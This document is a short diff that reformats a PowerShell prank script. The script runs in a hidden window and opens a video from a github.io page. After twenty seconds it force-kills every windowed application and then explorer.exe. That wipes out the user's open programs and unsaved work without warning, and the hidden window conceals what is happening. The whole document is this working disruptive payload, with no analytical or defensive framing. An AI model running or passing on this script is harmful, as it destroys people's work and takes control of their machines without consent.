@@ -1,1 +1,9 @@
-powershell -w hidden "start https://H4K0N42.github.io/nggyu/video.webm; Start-Sleep 20; Get-Process |? { $_.MainWindowTitle -ne '' -and $_.Id -ne $PID -and $_.ProcessName -ne 'explorer' } | Stop-Process -Force; taskkill /F /IM explorer.exe"
+powershell -WindowStyle Hidden -Command {
+    start https://H4K0N42.github.io/nggyu/video.webm
+    Start-Sleep 20
+    $self = $PID
+    Get-Process |
+        Where-Object { $_.MainWindowTitle -ne '' -and $_.Id -ne $self -and $_.ProcessName -ne 'explorer' } |
+        Stop-Process -Force
+    taskkill /F /IM explorer.exe
+}
